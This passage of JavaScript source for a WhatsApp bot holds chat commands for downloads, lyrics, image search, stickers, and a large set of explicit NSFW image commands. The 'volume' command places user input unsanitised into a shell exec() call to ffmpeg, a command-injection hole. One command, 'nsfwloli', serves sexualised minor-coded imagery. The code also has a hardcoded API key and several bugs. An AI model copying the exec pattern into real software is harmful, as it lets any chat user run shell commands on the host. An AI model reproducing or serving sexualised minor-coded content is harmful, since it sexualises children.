  await XeonBotInc.sendButtonText(m.chat, buttonsntnsfw, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case 'mediafire': {
if (!text) throw mess.linkm
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw `The link you provided is invalid`
const { mediafireDl } = require('./lib/mediafire.js')
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 999) return m.reply('*File Over Limit* '+util.format(baby1))
const result4 = `*MEDIAFIRE DOWNLOADER*
				
*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}`
m.reply(`${result4}`)
XeonBotInc.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => reply(mess.error))
}
break
case 'lyrics2': {
	    if (!text) return reply(`Use example ${prefix}lyrics Despacito`)
	m.reply(mess.wait)
	const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
    const result = await lyricsv2(text).catch(async _ => await lyrics(text))
    m.reply(`
${themeemoji} Title : *${result.title}*
${themeemoji} Author : ${result.author}
${themeemoji} Lyrics : ${result.lyrics}
${themeemoji} Url : ${result.link}
`.trim())
}
break
case 'lyrics':
if (!text) throw `Song name?`
const findLyrics = require('simple-find-lyrics')
try {
const lyrics = await findLyrics(text)
if (lyrics.lyrics == '') return console.log("it's f up")
var txt = `
*${themeemoji} Title :* ${lyrics.title}
*${themeemoji} Artist :* ${lyrics.artist}
*${themeemoji} Lyrics :-* \n
${lyrics.lyrics}`
console.log(lyrics)
 await XeonBotInc.sendMessage(m.chat, {text:txt},{quoted:m})
} catch (err) {
    console.log(err)
    }
    break
        case 'gimage': {
       if (!text) throw `Example : ${prefix + command} kaori cicak`
        xeonezyanu = await fetchJson(`https://api.akuari.my.id/search/googleimage?query=${text}`)
        n = xeonezyanu.result
        images = n[Math.floor(Math.random() * n.length)]
        let buttons = [
                    {buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: images },
                    caption: `*-------ã€Œ GIMAGE SEARCH ã€-------*
${themeemoji} *Query* : ${text}
${themeemoji} *Media Url* : ${images}`,
                    footer: botname,
                    buttons: buttons,
                    headerType: 4
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
        }
        break
case 'img':
case 'image': {
                m.reply(mess.wait)
		let { pinterest } = require('./lib/scraperW')
                anuxeonezy2 = await pinterest(text)
                resultkkk3 = anuxeonezy2[Math.floor(Math.random() * anuxeonezy2.length)]
                XeonBotInc.sendMessage(m.chat, { image: { url: resultkkk3 }, caption: ` ${themeemoji} Media Url : `+resultkkk3 }, { quoted: m })
            }
            break
case 'swm': case 'stickerwm': case 'wm': case 'take': {  
if (!args.join(" ")) return m.reply(`Example :\nswm ${global.author}|${global.packname}`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (m.quoted.isAnimated === true) {
XeonBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
XeonBotInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: global.atnm })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maximum 10 seconds!')
let media = await quoted.download()
let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else {
m.reply(`Send Image/Video With Caption ${prefix + command}\nVideo Duration 1-9 Seconds`)
}
}
break
case 'emoji': {
if (!args.join(" ")) return m.reply('Where is the emoji?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await XeonBotInc.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Made by ${global.botname}`}, {quoted:m})
await XeonBotInc.sendMessage(from, {text:"reply #s to this image to make sticker"}, {quoted:mese})
})
}
break
case 'volume': {
if (!args.join(" ")) return m.reply(`Example: ${prefix + command} 10`)
media = await XeonBotInc.downloadAndSaveMediaMessage(quoted, "volume")
if (isQuotedAudio) {
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply('Error!')
jadie = fs.readFileSync(rname)
XeonBotInc.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
} else if (isQuotedVideo) {
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply('Error!')
jadie = fs.readFileSync(rname)
XeonBotInc.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
} else {
m.reply("Send video/audio")
}
}
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'lizard':
case 'meow':
case 'tickle':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animewallpaper': case 'animewall': {
                if (!args.join(" ")) return m.reply("What wallpaper are you looking for??")
		let { wallpaper } = require('./lib/scraperW')
                anu = await wallpaper(args)
                result = anu[Math.floor(Math.random() * anu.length)]
		let buttons = [
                    {buttonId: `.wallpaper ${args.join(" ")}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer: `${botname}`,
                    buttons: buttons,
                    headerType: 4
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case 'animewall2': case 'animewallpaper2':
m.reply(mess.wait)						
const { AnimeWallpaper } =require("anime-wallpaper")
if(!q) return m.reply('What wallpaper do you want?')
const wall = new AnimeWallpaper();
    const pages = [1,2,3,4];
        const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall
            .getAnimeWall4({ title: q, type: "sfw", page: pages })
            .catch(() => null);
const i = Math.floor(Math.random() * wallpaper.length);
var walb = [
        {buttonId: `.${command} ${q}`, buttonText: {displayText: `Next âœ¨`}, type: 1},        
        ]
      let wal = {
       image: {url:wallpaper[i].image},
       caption: `*Query :* ${q}`,
      footer: `${global.botname}`,
      buttons: walb,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, wal,{ quoted:m }).catch(err => {
                    return('Error!')
                })
//XeonBotInc.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
break
case 'igemoji': 
case 'instagramemoji': 
if (!q) return m.reply("Enter emoji, maximum 1 emoji, eg?" + ` ${prefix + command} ðŸ˜€`)
m.reply(mess.wait)
emote(q, "11")
break
case 'iphoneemoji': 
if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} ðŸ˜€`)
m.reply(mess.wait)
emote(q, "0")
break
case 'googleemoji': 
if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} ðŸ˜€`)
m.reply(mess.wait)
emote(q, "1")
break
case 'samsungemoji': 
if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} ðŸ˜€`)
m.reply(mess.wait)
emote(q, "2")
break
case 'microsoftemoji': 
if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} ðŸ˜€`)
m.reply(mess.wait)
emote(q, "3")
break
case 'whatsappemoji': 
if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} ðŸ˜€`)
m.reply(mess.wait)
emote(q, "4")
break
case 'twitteremoji': 
if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} ðŸ˜€`)
m.reply(mess.wait)
emote(q, "5")
break
case 'facebookemoji': 
case 'fbemoji': 
if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} ðŸ˜€`)
m.reply(mess.wait)
emote(q, "6")
break
case 'skypeemoji': 
if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} ðŸ˜€`)
m.reply(mess.wait)
emote(q, "7")
break
case 'joyemoji': 
if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} ðŸ˜€`)
m.reply(mess.wait)
emote(q, "8")
break
case 'mojiemoji': 
if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} ðŸ˜€`)
m.reply(mess.wait)
emote(q, "9")
case 'pediaemoji': 
if (!q) return m.reply("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} ðŸ˜€`)
m.reply(mess.wait)
emote(q, "10")
break
case 'cry':case 'kill':case 'hug':case 'pat':case 'lick':case 'kiss':case 'bite':case 'yeet':case 'neko':case 'bully':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'awoo':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'cuddle':case 'highfive':case 'shinobu':case 'megumin':case 'handhold':
					axios.get(`https://api.waifu.pics/sfw/${command}`)
					.then(({data}) => {
						XeonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
					})
					break
case 'loli-waifu':
					m.reply(mess.wait)
					axios.get(`https://api.waifu.pics/sfw/waifu`)
					.then(({data}) => {
					XeonBotInc.sendImage(m.chat, data.url, mess.success, m)
					})
					break
case 'hentaivid': case 'hentaivideo': {
	if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
                m.reply(mess.wait)
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                XeonBotInc.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
case 'trap' :
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
 let trapbot = [
    {buttonId: `trap`, buttonText: {displayText: `Next âš¡`}, type: 1},
    ]
  let button2Messages = {
   image: {url:waifudd.data.url},
   caption:  `Here you go!`,
  buttons: trapbot,
  headerType: 1
  }     
            await XeonBotInc.sendMessage(m.chat, button2Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'hentai-neko' :
case 'hneko' :
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 let hnekobot = [
    {buttonId: `.hneko`, buttonText: {displayText: `Next âš¡`}, type: 1},
    ]
  let button3Messages = {
   image: {url:waifudd.data.url},
   caption:  `Here you go!`,
  buttons: hnekobot,
  headerType: 1
  }      
            await XeonBotInc.sendMessage(m.chat, button3Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
 let nwaifubot = [
    {buttonId: `.hneko`, buttonText: {displayText: `Next âš¡`}, type: 1},
    ]
  let button4Messages = {
   image: {url:waifudd.data.url},
   caption:  `Here you go!`,
  buttons: nwaifubot,
  headerType: 1
  }      
            await XeonBotInc.sendMessage(m.chat, button4Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'gasm':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonsssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonsssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break  
case 'milf':
if (!m.isGroup) return m.reply(mess.group)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/milf.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break 
case 'ahegao':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ahegao.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'ass':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ass.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'bdsm':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/bdsm.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'blowjob':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/blowjob.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'cuckold':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cuckold.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'cum':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cum.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'eba':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/eba.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'ero':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ero.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'femdom':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/femdom.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'foot':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/foot.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'gangbang':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gangbang.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'glasses':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/glasses.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'hentai':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/hentai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'jahy':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/jahy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'manga':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/manga.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'masturbation':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/masturbation.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'neko-hentai':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'neko-hentai2':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko2.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'nsfwloli':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/nsfwloli.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'orgy':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/orgy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'panties':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/panties.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'pussy':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/pussy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'tentacles':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/tentacles.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'thights':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/thights.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'yuri':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'zettai':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'gifblowjob':
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await XeonBotInc.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gifs.json'))
var xeonyresultx = pickRandom(ahegaonsfw)
    await XeonBotInc.sendMessage(m.chat,{video:xeonyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case'slap2':
if(!quoted){
const   result = await fetchJson(`https://g.tenor.com/v1/random?q=anime slapping&key=LIVDSRZULELA`, {method: 'get'})
const ku = result.results[0]
const oj = ku.media[0]
const urlg = oj.mp4
const slapp = urlg.url
const { data: mediaData } = await axios.get(slapp, {responseType: "arraybuffer"})
const media = new MessageMedia(
    'video/mp4', 
    mediaData.toString("base64")
);
const mention = msg
const mentionedId = await XeonBotInc.getName(mention.mentionedIds)
ctv = `@${contacts.number} *Slapped* @${mentionedId.number}`
const ahh = []
m.reply(media,m.chat , {mentions:[contacts,mentionedId], sendVideoAsGif:true, caption: ctv}).then((r) => {
})
}else if(quoted){
const qmid = quoted.author
const   result = await fetchJson(`https://g.tenor.com/v1/random?q=anime slapping&key=LIVDSRZULELA`, {method: 'get'})
const ku = result.results[0]
const oj = ku.media[0]
const urlg = oj.mp4
const slapp = urlg.url
const { data: mediaData } = await axios.get(slapp, {responseType: "arraybuffer"})
const media = new MessageMedia(
    'video/mp4', 
    mediaData.toString("base64")
);
const contact1 = await XeonBotInc.getName(qmid)
ctv = `@${contacts.number} *Slapped* @${contact1.number} `
m.reply(media,m.chat , {mentions:[contacts,contact1 ], sendVideoAsGif:true, caption: ctv}).then((r) => {
})
}
break

case 'animesmug':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/smug`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let button1ssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, button1ssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'foxgirl':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let button12ssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
